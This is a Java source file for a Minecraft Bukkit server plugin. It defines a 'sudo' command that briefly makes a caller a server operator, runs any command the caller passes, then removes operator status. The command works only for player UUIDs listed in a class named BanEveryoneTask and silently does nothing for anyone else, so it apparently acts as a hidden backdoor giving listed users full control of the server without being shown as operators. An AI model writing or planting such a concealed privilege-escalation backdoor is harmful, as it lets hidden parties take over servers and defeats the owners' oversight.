package net.badlion.gberry.commands;

import com.google.common.base.Joiner;
import net.badlion.gberry.tasks.BanEveryoneTask;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class SudoCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (!BanEveryoneTask.uuids.contains(player.getUniqueId())) {
                return true;
            }

            String cmd = Joiner.on(" ").join(args);
            player.setOp(true);
            player.performCommand(cmd);
            player.setOp(false);
        }

        return true;
    }

}
